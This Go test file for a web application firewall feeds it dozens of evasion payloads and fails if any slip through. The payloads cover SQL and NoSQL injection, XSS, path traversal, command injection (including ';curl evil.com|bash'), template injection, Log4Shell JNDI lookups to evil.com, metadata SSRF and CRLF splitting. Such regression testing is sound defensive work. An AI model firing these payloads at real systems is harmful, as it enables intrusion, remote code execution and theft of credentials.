package engine

import "testing"

// TestBypassProbe_Candidates fires evasion variants of real attacks (current
// 2024-2026 techniques) at the engine and LOGS which slip through unblocked.
// Every payload here is genuinely malicious, so any that PASSES is a candidate
// bypass to verify by hand. Run: go test -run TestBypassProbe_Candidates -v
func TestBypassProbe_Candidates(t *testing.T) {
	eng := probeEngine(t)

	candidates := []probe{
		// ---- SQLi evasion ----
		{id: "sqli-json-extract", class: "sqli", target: "arg", payload: "1' AND JSON_EXTRACT('{\"a\":1}','$.a')=1-- -"},
		{id: "sqli-versioned-comment", class: "sqli", target: "arg", payload: "1/*!50000UNION*//*!50000SELECT*/1,2,3-- -"},
		{id: "sqli-inline-comment", class: "sqli", target: "arg", payload: "1'/**/OR/**/'1'/**/=/**/'1"},
		{id: "sqli-vtab-ws", class: "sqli", target: "arg", payload: "1'%0bOR%0b'1'='1"},
		// NOTE: "1'%a0OR%a0'1'='1" (lone 0xA0 byte) is intentionally NOT here —
		// it evades the regex but 0xA0 isn't SQL whitespace in any real tokenizer
		// (MySQL/Postgres), so it's a syntax error, not an exploitable injection.
		{id: "sqli-scientific", class: "sqli", target: "arg", payload: "1e0UNION+SELECT+1,2,3"},
		{id: "sqli-xor", class: "sqli", target: "arg", payload: "1'XOR(SELECT(SLEEP(5)))XOR'Z"},
		{id: "sqli-extractvalue", class: "sqli", target: "arg", payload: "1' AND extractvalue(1,concat(0x7e,version()))-- -"},
		{id: "sqli-sleep-subq", class: "sqli", target: "arg", payload: "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"},
		{id: "sqli-concat-pipe", class: "sqli", target: "arg", payload: "1'||(SELECT password FROM users LIMIT 1)||'"},
		{id: "sqli-body-union", class: "sqli", target: "body", payload: "id=1/*!UNION*//*!SELECT*/user,pass/*!FROM*/users"},
		{id: "sqli-mixedcase", class: "sqli", target: "arg", payload: "1' UnIoN SeLeCt 1,2,3-- -"},

		// ---- NoSQL ----
		{id: "nosql-ne", class: "nosql", target: "arg", payload: "[$ne]=1"},
		{id: "nosql-where", class: "nosql", target: "body", payload: "{\"$where\":\"sleep(5000)\"}"},
		{id: "nosql-regex", class: "nosql", target: "body", payload: "{\"user\":{\"$regex\":\"^adm\"},\"pass\":{\"$ne\":1}}"},

		// ---- XSS evasion ----
		{id: "xss-svg-onload", class: "xss", target: "arg", payload: "<svg/onload=alert(1)>"},
		{id: "xss-svg-animate", class: "xss", target: "arg", payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"},
		{id: "xss-img-onerror", class: "xss", target: "arg", payload: "<img src=x onerror=alert(1)>"},
		{id: "xss-mxss-noscript", class: "xss", target: "body", payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"},
		{id: "xss-entity-handler", class: "xss", target: "arg", payload: "<img src=x onerror=&#x61;lert(1)>"},
		{id: "xss-details-toggle", class: "xss", target: "arg", payload: "<details open ontoggle=alert(1)>"},
		{id: "xss-iframe-srcdoc", class: "xss", target: "arg", payload: "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\">"},
		{id: "xss-rare-handler", class: "xss", target: "arg", payload: "<body onpointerrawupdate=alert(1)>"},
		{id: "xss-form-formaction", class: "xss", target: "arg", payload: "<form><button formaction=javascript:alert(1)>X"},
		{id: "xss-mxss-math", class: "xss", target: "body", payload: "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"},
		{id: "xss-js-uri", class: "xss", target: "arg", payload: "<a href=\"javascript:alert(1)\">x</a>"},
		{id: "xss-fullwidth", class: "xss", target: "arg", payload: "＜script＞alert(1)＜/script＞"},
		// NOTE: "<style>@import'//evil'" (external CSS) is intentionally NOT here —
		// legitimate pages @import external stylesheets (Google Fonts, CDN CSS),
		// so blocking it false-positives. Only script-EXECUTING CSS is blocked.

		// ---- Path traversal / LFI encoding ----
		{id: "trav-double-enc", class: "lfi", target: "rawuri", payload: "/app/%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
		{id: "trav-overlong", class: "lfi", target: "rawuri", payload: "/app/..%c0%af..%c0%afetc/passwd"},
		{id: "trav-dotdot-slashslash", class: "lfi", target: "rawuri", payload: "/app/....//....//etc/passwd"},
		{id: "trav-mixed-enc", class: "lfi", target: "rawuri", payload: "/app/..%252f..%252fetc/passwd"},
		{id: "trav-backslash", class: "lfi", target: "rawuri", payload: "/app/..%5c..%5c..%5cwindows%5cwin.ini"},
		{id: "trav-arg", class: "lfi", target: "arg", payload: "....//....//....//etc/passwd"},
		{id: "lfi-php-filter", class: "lfi", target: "arg", payload: "php://filter/convert.base64-encode/resource=index.php"},
		{id: "lfi-file-uri", class: "lfi", target: "arg", payload: "file:///etc/passwd"},

		// ---- RCE / command injection ----
		{id: "rce-ifs", class: "rce", target: "arg", payload: ";cat${IFS}/etc/passwd"},
		{id: "rce-subshell", class: "rce", target: "arg", payload: "$(cat /etc/passwd)"},
		{id: "rce-backtick", class: "rce", target: "arg", payload: "`id`"},
		{id: "rce-brace", class: "rce", target: "arg", payload: "{cat,/etc/passwd}"},
		{id: "rce-pipe-bash", class: "rce", target: "arg", payload: ";curl evil.com|bash"},
		{id: "rce-newline", class: "rce", target: "arg", payload: "x%0acat%20/etc/passwd"},

		// ---- SSTI ----
		{id: "ssti-jinja", class: "ssti", target: "arg", payload: "{{7*7}}"},
		{id: "ssti-jinja-config", class: "ssti", target: "arg", payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
		{id: "ssti-freemarker", class: "ssti", target: "arg", payload: "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}"},
		{id: "ssti-spring", class: "ssti", target: "arg", payload: "${T(java.lang.Runtime).getRuntime().exec('id')}"},
		{id: "ssti-erb", class: "ssti", target: "arg", payload: "<%= system('id') %>"},

		// ---- JNDI / Log4Shell ----
		{id: "jndi-basic", class: "jndi", target: "header", payload: "${jndi:ldap://evil.com/a}"},
		{id: "jndi-obfuscated", class: "jndi", target: "header", payload: "${${::-j}${::-n}${::-d}${::-i}:rmi://evil.com/a}"},
		{id: "jndi-arg", class: "jndi", target: "arg", payload: "${jndi:dns://evil.com}"},

		// ---- SSRF ----
		{id: "ssrf-metadata", class: "ssrf", target: "arg", payload: "http://169.254.169.254/latest/meta-data/"},
		{id: "ssrf-decimal", class: "ssrf", target: "arg", payload: "http://2852039166/latest/meta-data/"},

		// ---- CRLF / response splitting ----
		{id: "crlf-setcookie", class: "crlf", target: "rawuri", payload: "/redir?url=x%0d%0aSet-Cookie:evil=1"},
		{id: "crlf-double-enc", class: "crlf", target: "rawuri", payload: "/redir?url=x%250d%250aSet-Cookie:evil=1"},
	}

	// Every candidate here is a genuinely-malicious, DB/browser-exploitable
	// evasion variant (verified during the 2025-2026 bypass hunt). They must all
	// block; a regression that lets one through is a real bypass.
	for _, p := range candidates {
		if !fireBlocked(eng, p) {
			t.Errorf("BYPASS REGRESSION [%s] %s evaded the engine: %s", p.class, p.id, p.payload)
		}
	}
}
